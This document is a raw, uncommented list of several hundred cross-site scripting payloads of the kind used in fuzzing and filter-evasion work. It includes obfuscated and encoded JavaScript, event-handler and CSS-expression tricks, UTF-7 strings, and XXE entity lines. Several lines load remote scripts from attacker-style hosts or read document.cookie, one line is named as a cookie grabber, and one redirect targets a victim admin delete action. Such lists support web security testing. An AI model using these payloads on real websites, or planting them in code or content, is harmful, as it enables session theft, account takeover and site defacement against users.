<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
"><STYLE>@import"javascript:alert('XSS')";</STYLE>
%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E
<input onblur=write(1) autofocus><input autofocus>
@cc_on@set@_=5e-324@_?alert(@set@alert=1@alert):@_
eval('ale'+/............../.__proto__[-1]+'rt(1)')
data:text/html,<script>location+=location</script>
?test=" type="image" src="x" onerror="alert(/XSS/)
$\u5002=$\u5002[/replace/[-$\u5003]](/u/g,$\u5001)
eval((['alee','(rt(1(,))']+'').replace(/.,./g,''))
Function(<text>\u0061{new String}lert(1)</text>)()
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js...
<div onmouseover="document.write("XSS-XSS-XSS");">
script-typetextjavascriptalertdocumentcookiescript
&#39;">><<<iMg sRc = 1.gif onerror = alert("1")>>>
</title><SCRIPT>document.vulnerable=true;</script>
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<;BODY BACKGROUND=";javascript:alert(';XSS';);";>;
2) <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
26) <img/src=@&#32;&#13; onerror = prompt('&#49;')
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<script language="JavaScript">alert('XSS')</script>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
27) <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
21) <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
>"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>
<x '="foo"><x foo='><img src=x onerror=alert(1)//'>
<div style="font-family:'foo&#10;;color:red;';">XXX
<meta charset="mac-farsi">¼script¾alert(1)¼/script¾
<style> BODY{-moz\00002dbinding:url(URL)} </style> 
[$='ale'+'rt(1)']|[_=frames['Fun'+'ction']]|_($)() 
window.window.window.window.window.window.alert(2);
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
<iframe src="javascript:document.vulnerable=true; <
<script>a=/XSS/\ndocument.vulnerable=true;</script>
<img DYNSRC="javascript:document.vulnerable=true;">
<img LOWSRC="javascript:document.vulnerable=true;">
<;IMG SRC="; &;#14;  javascript:alert(';XSS';);";>;
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
µ=<µ ß='le' µ='a' ø='rt'></µ>,top[µ.@µ+µ.@ß+µ.@ø](µ)
Date [decodeURI('e%76al')] (decodeURI('a%6Cert(1)'))
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<div style="x:expression((window.r==1)?'':eval('r=1;
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
15) <input value=<><iframe/src=javascript:confirm(1)
7) <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
26) <svg contentScriptType=text/vbs><script>MsgBox+1
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
a=/aalertt/;/a(.*)t/.test(a),a=eval(RegExp.$1),a(0) 
7) <var onmouseover="prompt(1)">On Mouse Over</var>​
eval('(' + typeof setTimeout + '(){ alert(1) })()');
<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
<;DIV STYLE=";width: expression(alert(';XSS';));";>;
<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
<base HREF="javascript:document.vulnerable=true;//">
<bgsound SRC="javascript:document.vulnerable=true;">
<a href="javascript#document.write("XSS-XSS-XSS");">
<script/src=data:text/javascript,alert(1)></script> 
alert(Anything[-6]); // alerts the string "Anything"
(0).constructor.constructor('return alert("\141")')()
<!-- -- -- -- --<script>alert('XSS')</script> -- --> 
<a href= harmless=" onmouseover=alert(1)//">test</a> 
<script src="data:text/javascript,alert(1)"></script>
 with(' the help of'+ typeof AnYThing )alert(1);s :-P
<p onmousemove="alert(/XSS/)">Long paragraph here</p>
<script>alert(String.fromCharCode(88,83,83))</script>
<!DOCTYPE x[<!ENTITY x SYSTEM "test.xxe">]><y>&x;</y>
24) <math><a xlink:href="//jsfiddle.net/t846h/">click
</textarea>'"><script>alert(document.cookie)</script>
47) <math><a xlink:href="//jsfiddle.net/t846h/">click
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
36) <img src ?itworksonchrome?\/onerror = alert(1)​​​
<img src="livescript:document.write("XSS-XSS-XSS");">
<img src="javascript:document.write("XSS-XSS-XSS");">
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
<;IMG ";";";>;<;SCRIPT>;alert(";XSS";)<;/SCRIPT>;";>;
<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
<input type="image" src="x" onerror="alert(/XSS/)" /> 
&#21477;=RegExp(/e/)[&#54280;]+RegExp(/val/)[&#54280;]
Here's how to create a string from any function name:-
javascript: x = window;y=document; x.alert(y.cookie); 
perl -e 'print "<SCRIPT>alert("XSS")</SCRIPT>";' > out
<iframe src="vbscript:document.write("XSS-XSS-XSS");">
['ale'+'rt'].map(top['ev'+'al'])[0]['valu'+'eOf']()(1)
<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
<XSS STYLE="xss:expression(document.vulnerable=true)">
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
49) </plaintext\></|\><plaintext/onmouseover=prompt(1)
37) <svg><script>//&NewLine;confirm(1);</script </svg>
4) <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<table background="javascript:alert(([code])"></table>
<font style='color:expression(alert(document.cookie))'>
"><script alert(String.fromCharCode(88,83,83))</script>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<?import namespace="t" implementation="#default#time2">
<script src=http://yoursite.com/your_files.js></script>
1) <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
<;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";>;
<img src="blah"onmouseover="document.vulnerable=true;">
<img SRC=" &#14; javascript:document.vulnerable=true;">
>%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>
blur['con'+'structor']('_','eva'+'l(_)')('a'+'lert(1)')
top[(Number.MAX_VALUE/45268).toString(36).slice(15,19)]
\u0030\u005b'\145\166\x61\x6C'\u005d\u0028\u0065\u0029 
typeof setTimeout('\x61\x6c\x65\x72\x74\x28\x31\x29',0)
//<style>*{color:red}</style><script> {eval(name)}body 
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<title onpropertychange=alert(1)></title><title title=>
%253cscript%253ealert(document.cookie)%253c/script%253e
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<input name="test" value="<?php echo $_GET['test']?>" />
eval(['alee','(rt(1(,))'].toString().replace(/.,./g,''))
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
9) <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
19) <form><a href="javascript:\u0061lert&#x28;1&#x29;">X
'>"><script src = 'http://www.site.com/XSS.js'></script>
<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`>;
<;IFRAME SRC=";javascript:alert(';XSS';);";>;<;/IFRAME>;
<div datafld="b" dataformatas="html" datasrc="#X"></div>
<![<!--]]<script>document.vulnerable=true;//--></script>
<body BACKGROUND="javascript:document.vulnerable=true;">
<img dynsrc="javascript:document.write("XSS-XSS-XSS");">
<style><img src="</style><img src=x onerror=alert(1)//">
{color:red;xss:expression(window.x?0:(eval(name),x=1))} 
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
<img src="blah>" onmouseover="document.vulnerable=true;">
<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
<iframe<?php echo chr(12)?> onload=alert(/XSS/)></iframe>
<bgsound src="javascript:document.write("XSS-XSS-XSS");">
<XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">
<table BACKGROUND="javascript:document.vulnerable=true;">
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
41) <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
[color=red' onmouseover="alert('xss')"]mouse over[/color]
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
11) <script src="data:text/javascript,alert(1)"></script>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<iframe<?php echo chr(11)?> onload=alert(/XSS/)></iframe> 
&#22924;=RegExp(/a/)[&#54280;]+RegExp(/lert(1)/)[&#54280;]
<var onmousemove="alert(/XSS/)">Long paragraph here</var> 
>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
eval((function ale(){}).name+(function rt(){}).name+'(1)')
* {-o-link:'javascript:alert(1)';-o-link-source: current;}
<div style=width:1px;filter:glow onfilterchange=alert(1)>x
<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
perl -e 'print "<IMG SRC=javascript:alert("XSS")>";' > out
11) <script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
30) &#00;</form><input type&#61;"date" onfocus="alert(1)">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
6) <form><isindex formaction="javascript&colon;confirm(1)"
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<div STYLE="width: expression(document.vulnerable=true);">
<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
<A HREF="h&#x0A;tt&#09;p://6&#09;6.000146.0x7.147/">XSS</A>
<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
32) <object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
42) <div/style="width:expression(confirm(1))">X</div> {IE7}
//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));
<div style="width: expression(document.vulnerable=true;);">
<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";>;
<a href="about:<script>document.vulnerable=true;</script>">
<;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>;
<;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;
perl -e 'print "&<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
<object allowscriptaccess="always" data="test.swf"></object>
['ale'+'rt']['m'+'ap'](top['ev'+'al'])[0]['valu'+'eOf']()(1)
<a onclick="URL='javascript:alert(/XSS/)'" href="#">Test</a>
if(false)sdfasdfsad(),dasfasdfsfd,fasdfsdfs();else alert(1);
";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115....> 
<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
<;TABLE BACKGROUND=";javascript:alert(';XSS';)";>;<;/TABLE>;
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
28) <script ^__^>alert(String.fromCharCode(49))</script ^__^
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
<table><TD BACKGROUND="javascript:document.vulnerable=true;">
<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
javascript:if(typeof%20wWXzys==typeof%20alert)wWXzys();alert(
33) <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
3) <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
document.body.runtimeStyle.cssText = '1:expression(alert(1))'
X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
<style>@import "data:,*%7bx:expression(write(1))%7D";</style>
<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
<comment><img src="</comment><img src=x onerror=alert(1))//">
perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
46) <form><button formaction=javascript&colon;alert(1)>CLICKME
2) <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
((Number.MAX_VALUE/99808).toString(36).slice(71,76)+'("XSS")')
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<script SRC="http://www.securitycompass.com/xss.jpg"></script>
<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";>;
Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser
<style>@import'http://www.securitycompass.com/xss.css';</style>
<style TYPE="text/javascript">document.vulnerable=true;</style>
<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
</script></script><<<<script><>>>><<<script>alert(123)</script>
<html><noalert><noscript>(123)</noscript><script>(123)</script>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
'""><script language="JavaScript"> alert('X \nS \nS');</script>
36) <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
location=<text>javascr{new Array}ipt:aler{new Array}t(1)</text>
<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
35) <script itworksinallbrowsers>/*<script* */alert(1)</script ​
37) <///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
<script>alert(1337)</script><marquee><h1>XSS by 1</h1></marquee>
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);
<object data=data:text/html;,%3cscript%3ealert(4);%3c/script%3e>
<a href="about:<script>document.write("XSS-XSS-XSS");</script>">
<div style="width: expression(document.write("XSS-XSS-XSS"););">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
13) <iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X
<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
<script src="http://www.evilsite.org/cookiegrabber.php"></script>
<@uni>0[<@/uni>'<@oct>ev<@/oct><@hex>al<@/hex>'<@uni>](e)<@/uni> 
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
45) "><img src=x onerror=window.open('https://www.google.com/');>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out
<;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";>;
<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
24) http://www.google<script .com>alert(document.location)</script
16) <input type="text" value=``<div/onmouseover='alert(1)'>X</div>
<style><!--</style><script>document.vulnerable=true;//--></script>
<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
<input type="image" dynsrc="javascript:document.vulnerable=true;">
<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
<object type=text/html data="javascript:alert(([code]);"></object>
with(RegExp)an:alert(true,'ly is possible');too:!!!1,('of course')
{µ=String.fromCharCode;eval('alert('+µ(91)+'1,2,3,4,5'+µ(93)+')')}
\u50001=/atob('YWxlcnQoJ01lcnJ5IENocmlzdG1hcyBoYWNrZXJzIScp')/[-1]
<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:alert(1)>XXX</a>
<><this/><is/><valid/><javascript/></>..*.*.*..text(alert('Hehe'));
<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
<style type="text/javascript">document.write("XSS-XSS-XSS");</style>
48) <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
{var {5:y,2:q,1:z,4:u,3:r,0:w}="velart"}[0][z+w+r+q](r+q+z+u+y)(123)
top['eval'] === top['anything',1,0,false,true,null,undefined,'eval']
[[url=http://brainpillow.cc]y3t an0ther unstarted h0me blog..[/url]]
<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
17) <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
typeof typeof typeof typeof typeof typeof typeof typeof undefined(1);
<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
<;FRAMESET>;<;FRAME SRC=";javascript:alert(';XSS';);";>;<;/FRAMESET>;
<script xmlns="http://www.w3.org/1999/xhtml" id="x">alert(1)</script>
/iiiiggggmmmm/iiiiiggggmmmm/ /iiiiiggggmmmmmmm/iiiiiggggmmmm/alert(1) 
æ:with(/æ/)õ:'æ';Þ:!0e1,alert(/Ð/);throw'å',(1in Þ),'æ';ã:'å'+(æ=1);-ã
eval(String(/\x61\x6c\x65\x72\x74\x28\x31\x29/.exec(/zzzzalert(1)/)));
location=XML(<x>java{[]}script:ale{[]}rt(/I am a e4x haxor/)</x>).*::*
<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
38) <img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
23) <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<image src="http://somedomain/somegraphic.jpg" onload="alert(/XSS/)" />
try{c=/wtf/[-5]+'rt(/#/[-2])',a}catch(b){b.eval(c.replace(/[fs]/g,''))}
a:;{;1*(1/(this.window.top[(('')+("alert")+(''))])(/1/.source)+1)-1;}; 
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==>
<input type="image" dynsrc="javascript:document.write("XSS-XSS-XSS");">
<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out
<script>alert("XSS by \n1")</script><marquee><h1>XSS by 1</h1></marquee>
<form id="test" /><button form="test" formaction="javascript:alert(1)">X
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
<link rel="stylesheet" href="javascript:document.write("XSS-XSS-XSS");">
\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
perl -e &#039;print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";&#039; > out
<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
"><script>alert(1337)</script>"><script>alert("XSS by \n1</h1></marquee>
  <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
1) <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
16) <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
<;TABLE>;<;TD BACKGROUND=";javascript:alert(';XSS';)";>;<;/TD>;<;/TABLE>;
<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
AK%22%20style%3D%22background:url(javascript:alert(%27XSS%27))%22%20OS%22
top['ev'+'al'](['al','ert','(1)']['toS'+'tring']()['repl'+'ace'](/,/g,''))
<\sc\r\ipt>ale\u0072t('SS\x58'.split('').reverse().join(''))<\/\sc\r\ipt> 
<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>
['red'],alert('sum 1 is');try{1in to}catch(me){alert(!1 & 'the police');} 
<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
</title><meta http-equiv='content-type' content='text/html;charset=utf-7'>
<div style="background-image: url(javascript:document.vulnerable=true;);">
39) &#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
perl -e &#039;print \"<IMG SRC=java\0script:alert(\"XSS\")>\";&#039; > out
"><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
"><script>alert("XSS by \n1")</script>><marquee><h1>XSS by 1</h1></marquee>
<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
18) <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
javascript:[$,_]=(function()[_ for each(_ in ["alert",eval])])(),_($)(123);
javascript:{http://%0A(%46un%63\u0074ion%0C(('\u0061le%72t((1))'))%0A())()}
<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
'"></title><script>alert(1337)</script>><marquee><h1>XSS by 1</h1></marquee>
<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>;
<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
<object data=data:text/html;charset=utf-8,%3cscript%3ealert(3);%3c/script%3e>
new Function(<text><x y="a"></x><x y="lert"></x><x y="(1)"></x></text>..@y)()
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
[$y=('al')]&&[$z=$y]&&[$z+=('ert')+[]][DocDan=(/ev/)[-1]+$y]($z).valueOf()(1) 
<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
for(i=1;i<5;i++){e+=String.fromCharCode((35/3)*P(i,3)-89*P(i,2)+(607/3)*i-24)}
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
45) /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
48) <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+1/+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ++alert(1)
<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
27) <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
8) <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<div style="background-image: url(javascript:document.write("XSS-XSS-XSS"););">
31) <form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
22) <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<img src=`&#14&#106&#97va&#9&#115&#99ript&#58ale&#114t&#47&#x2a&#102" alt="" /> 
<script>location=<text>javascr{new Array}ipt:aler{new Array}t(1)</text></script>
<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
22) <form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<!--[if]><script>alert(1)</script --> <!--[if<img src=x onerror=alert(1)//]> -->
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=alert(1)></a>">
<!DOCTYPE> <div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
<img """><script>alert("XSS by \n1")</script><marquee><h1>XSS by 1</h1></marquee>
perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
<;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>;
<a href="data::,&#x25;3Cscr&#37;69pt>%5Cu0061lert(1)</&#X00025;73cript>">XSS</a> 
"><script>eval(location.hash)</script> //where the url hash is: #0={};<<payload>> 
<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
28) <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
8) <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>
